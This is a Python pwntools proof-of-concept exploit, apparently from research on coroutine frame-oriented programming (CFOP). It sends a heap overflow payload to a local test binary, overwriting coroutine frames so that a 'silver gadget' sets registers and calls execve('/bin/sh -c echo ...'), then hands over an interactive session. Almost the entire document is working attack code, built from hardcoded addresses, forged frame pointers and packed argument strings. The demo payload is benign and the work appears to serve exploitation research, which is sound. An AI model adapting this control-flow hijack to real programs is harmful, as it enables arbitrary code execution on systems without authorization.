"""
Arbitrary code execution PoC.
This PoC shows how to call an arbitrary function with arbitrary arguments using CFOP.

Expected result of the exploit: "ARBITRARY CODE EXECUTION!" is printed on screen

Details on the exploit:
A heap-based buffer overflows after exploiting a buffer overflow vulnerability.
This buffer overwrites multiple coroutine frames.
Using a silver gadget, the exploit sets the needed register values according to the call convention.
Then, it calls the destination function (execve()).
A information leakeage vulnerability is assumed to exist, as to bypass ASLR.
"""

from pwn import *

context.update(arch='x86_64', os='linux', aslr=False)
context.aslr = False
binary = ELF('./clangpoc')
context.binary = binary
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process('./clangpoc')

# Values needed to construct execve(/bin/sh -c /usr/bin/echo "ARBITRARY CODE EXECUTION!")
BASH_ARG_PTR_PTR = 0x55555556b7a8
BASH_ARG0_PTR = 0x55555556b7c8
BASH_ARG1_PTR = 0x55555556b7d0
BASH_ARG2_PTR = 0x55555556b7d8
BASH_ARG0_CONTENT = 0x0068732f6e69622f
BASH_ARG1_CONTENT = 0x00632d
BASH_ARG2_CONTENT_1 = 0x524122206F686365
BASH_ARG2_CONTENT_2 = 0x2059524152544942
BASH_ARG2_CONTENT_3 = 0x4558452045444F43
BASH_ARG2_CONTENT_4 = 0x22214E4F49545543
BASH_ARG2_CONTENT_5 = 0x0
BASH_RSI = BASH_ARG_PTR_PTR
BASH_RDX = 0x0
BASH_RCX = 0x3

#Address of execve() in libc
EXECVE_FUNC = 0x155555055f30

#Buffer, to be overflown by a vulnerability
VULN_PTR = 0x000055555556b2b0 

#Address of silver gadget
SILVERFUNCTION_ADDRESS = 0x555555555c60

#Addresses of coroutine frames in the stack
C1_FRAME_START = 0x55555556b6e0
C2_FRAME_START = 0x55555556b720
C3_FRAME_START = 0x55555556b760
C1_FRAME_RESUME_PTR = BASH_ARG0_CONTENT # hijacked arg0
C2_FRAME_RESUME_PTR = SILVERFUNCTION_ADDRESS
C3_FRAME_RESUME_PTR = 0x555555555520
C1_FRAME_DESTROY_PTR = EXECVE_FUNC # address of arbitrary function to call
C2_FRAME_DESTROY_PTR = BASH_ARG_PTR_PTR
C3_FRAME_DESTROY_PTR = 0x555555555720


#padding for filling the vulnerable buffer up until overwritting the coroutine frame
initial_overflow_payload = b'A'*1072 

#new values for coroutine frames
overwrite_payload = \
    pack(C1_FRAME_RESUME_PTR) + pack(C1_FRAME_DESTROY_PTR) +\
    p64(0)*6 +\
    pack(C2_FRAME_RESUME_PTR) + pack(C2_FRAME_DESTROY_PTR) +\
    p64(0)*6 +\
    pack(C3_FRAME_RESUME_PTR) + pack(C3_FRAME_DESTROY_PTR) +\
    pack(C2_FRAME_START) + p64(0)

#fake class data, for setting register values via the silver gadget
payload_class_data = b'B'*0x10  + \
    p64(BASH_RCX) + p64(BASH_RSI) +  p64(BASH_RDX) 

payload_bash_data = pack(BASH_ARG0_PTR) + pack(BASH_ARG1_PTR) + pack(BASH_ARG2_PTR) + p64(0x0) + \
    pack(BASH_ARG0_CONTENT) + pack(BASH_ARG1_CONTENT) + pack(BASH_ARG2_CONTENT_1) + pack(BASH_ARG2_CONTENT_2) +\
    pack(BASH_ARG2_CONTENT_3) + pack(BASH_ARG2_CONTENT_4) + pack(BASH_ARG2_CONTENT_5)

p.recvuntil("starting c3()\n")
payload = initial_overflow_payload + overwrite_payload + payload_class_data + payload_bash_data
log.info("Overflowing coroutine frames... payload size: "+str(len(payload)))
p.sendline(payload)

log.success("Payload injected. If \"ARBITRARY CODE EXECUTION!\" was printed, it was a success")


p.interactive()
